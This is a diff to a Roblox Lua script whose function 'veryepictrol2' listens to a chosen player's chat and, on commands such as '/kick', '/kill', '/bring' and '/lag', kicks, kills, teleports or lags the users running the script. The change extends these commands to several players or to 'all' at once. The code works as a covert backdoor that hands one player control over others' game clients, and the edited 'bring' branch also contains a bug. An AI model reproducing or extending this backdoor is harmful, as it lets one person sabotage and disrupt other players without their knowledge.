@@ -35,7 +35,9 @@ function veryepictrol2(x)
                 end
             end
         elseif name == "all" then
-            return { game.Players.LocalPlayer }
+            for i, v in pairs(plrstbl) do
+                targets[#targets + 1] = v
+            end
         elseif name == "random" then
             for i, v in pairs(plrstbl) do
                 if v ~= game.Players.LocalPlayer then
@@ -53,40 +55,44 @@ function veryepictrol2(x)
         return targets
     end
 
-    lastchattedtime = 5;
+    lastchattedtime2 = 5;
     local prefixz = "/"
     local LzPlayer = x
-    local dz; dz = x.Chatted:Connect(function(msg)
-        if (tick() - lastchattedtime) < 0.4 then return end
-        lastchattedtime = tick()
-        msg = msg:lower()
-        if string.sub(msg, 1, 3) == "/e " then
-            msg = string.sub(msg, 4)
+    local dz; dz = x.Chatted:Connect(function(msg2)
+        if (tick() - lastchattedtime2) < 0.4 then return end
+        lastchattedtime2 = tick()
+        msg2 = msg2:lower()
+        if string.sub(msg2, 1, 3) == "/e " then
+            msg2 = string.sub(msg2, 4)
         end
-        if string.sub(msg, 1, 1) == prefixz then
+        if string.sub(msg2, 1, 1) == prefixz then
             local cmd2
-            local space = string.find(msg, " ")
+            local space = string.find(msg2, " ")
             if space then
-                cmd2 = string.sub(msg, 2, space - 1)
+                cmd2 = string.sub(msg2, 2, space - 1)
             else
-                cmd2 = string.sub(msg, 2)
+                cmd2 = string.sub(msg2, 2)
             end
             local ME = game:GetService("Workspace")[x.Name]
 
             if cmd2 == "kick" then
-                local who2 = string.sub(msg, space + 1)
-                local target2 = getPlayer2(who2)[1]
-                if game.Players.LocalPlayer == target2 then
-                    game.Players.LocalPlayer:Kick("kicked by admin")
+                local who2 = string.sub(msg2, space + 1)
+                local target2 = getPlayer2(who2)
+                for _,tar in(target2) do
+                    if game.Players.LocalPlayer == tar then
+                        game.Players.LocalPlayer:Kick("kicked by admin")
+                    end
                 end
             end
 
 
             if cmd2 == "kill" then
-                local who2 = string.sub(msg, space + 1)
-                local target2 = getPlayer2(who2)[1]
-                if game.Players.LocalPlayer == target2 then
-                    game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health = 0
+                local who2 = string.sub(msg2, space + 1)
+                local target2 = getPlayer2(who2)
+                for _,tar in(target2) do
+                    if game.Players.LocalPlayer == tar then
+                        game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health = 0
+                    end
                 end
             end
 
@@ -102,10 +108,12 @@ function veryepictrol2(x)
             end
 
             if cmd2 == "bring" then
-                local who2 = string.sub(msg, space + 1)
-                local target2 = getPlayer2(who2)[1]
-                if game.Players.LocalPlayer == target2 then
-                    target2.Character.HumanoidRootPart.CFrame = ME.HumanoidRootPart.CFrame
+                local who2 = string.sub(msg2, space + 1)
+                local target2 = getPlayer2(who2)
+                for _,tar in(target2) do
+                    if game.Players.LocalPlayer == tar then
+                        target2.Character.HumanoidRootPart.CFrame = ME.HumanoidRootPart.CFrame
+                    end
                 end
             end
 
@@ -142,20 +150,24 @@ function veryepictrol2(x)
 
             if cmd2 == "lag" then
                 wait(0.5)
-                local who2 = string.sub(msg, space + 1)
-                local target2 = getPlayer2(who2)[1]
-                if game.Players.LocalPlayer == target2 then
-                    settings().Network.IncomingReplicationLag = 1
+                local who2 = string.sub(msg2, space + 1)
+                local target2 = getPlayer2(who2)
+                for _,tar in(target2) do
+                    if game.Players.LocalPlayer == tar then
+                        settings().Network.IncomingReplicationLag = 1
+                    end
                 end
             end
 
 
             if cmd2 == "unlag" then
                 wait(0.5)
-                local who2 = string.sub(msg, space + 1)
-                local target2 = getPlayer2(who2)[1]
-                if game.Players.LocalPlayer == target2 then
-                    settings().Network.IncomingReplicationLag = 0
+                local who2 = string.sub(msg2, space + 1)
+                local target2 = getPlayer2(who2)
+                for _,tar in(target2) do
+                    if game.Players.LocalPlayer == tar then
+                        settings().Network.IncomingReplicationLag = 0
+                    end
                 end
             end
         end
